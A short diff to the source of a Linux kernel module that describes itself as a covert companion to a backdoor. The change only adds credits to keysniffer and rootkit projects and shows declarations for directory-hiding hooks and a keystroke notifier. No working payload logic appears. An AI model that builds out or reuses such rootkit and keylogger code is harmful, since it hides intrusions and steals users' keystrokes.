@@ -3,6 +3,9 @@
  * Date: 2018-09-22
  * Notes:
  * The covert module for complimenting the backdoor
+ * Keysniffer code modified from https://github.com/jarun/keysniffer/blob/master/keysniffer.c
+ * Includes modified code and concepts from https://github.com/nisay759/linux-rootkits
+ * Module show/hiding copied and modified from https://github.com/f0rb1dd3n/Reptile
  */
 
 #include <linux/circ_buf.h>
@@ -114,7 +117,6 @@ static int rk_filldir_t(struct dir_context* ctx, const char* proc_name, int len,
 static int proc_filldir_t(struct dir_context* ctx, const char* proc_name, int len, loff_t off,
         u64 ino, unsigned int d_type);
 
-//Keysniffer code modified from https://github.com/jarun/keysniffer/blob/master/keysniffer.c
 static struct notifier_block keysniffer_blk = {
         .notifier_call = keysniffer_cb,
 };
